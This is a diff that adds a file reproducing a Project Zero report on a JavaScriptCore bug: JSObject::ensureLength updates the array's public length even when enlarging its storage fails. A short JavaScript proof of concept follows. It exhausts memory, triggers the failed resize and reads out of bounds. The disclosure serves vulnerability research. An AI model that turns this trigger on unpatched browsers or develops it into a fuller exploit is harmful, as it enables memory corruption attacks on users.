@@ -1,0 +1,53 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1165
+
+Here's a snippet of JSObject::ensureLength.
+
+bool WARN_UNUSED_RETURN ensureLength(VM& vm, unsigned length)
+{
+    ASSERT(length < MAX_ARRAY_INDEX);
+    ASSERT(hasContiguous(indexingType()) || hasInt32(indexingType()) || hasDouble(indexingType()) || hasUndecided(indexingType()));
+
+    bool result = true;
+    if (m_butterfly.get()->vectorLength() < length)
+        result = ensureLengthSlow(vm, length);
+        
+    if (m_butterfly.get()->publicLength() < length)
+        m_butterfly.get()->setPublicLength(length);
+    return result;
+}
+
+|setPublicLength| is called whether |ensureLengthSlow| failed or not. So the |publicLength| may be lager than the actual allocated memory's size, which results in an OOB access.
+
+Tested on Linux.
+
+PoC:
+*/
+
+const kArrayLength = 0x200000;
+
+let arr = new Array(kArrayLength);
+arr.fill({});
+
+let exh = [];
+try {
+    for (;;) {
+        exh.push(new ArrayBuffer(kArrayLength * 8 * 8));
+    }
+} catch (e) {
+}
+
+try {
+    arr.length *= 8;
+    print('failed');
+} catch (e) {
+    print(e);
+
+    exh = null;
+
+    print('arr length: ' + arr.length.toString(16));
+    for (let i = kArrayLength, n = arr.length; i < n; i++) {
+        if (arr[i])
+            print(arr[i]);
+    }
+}
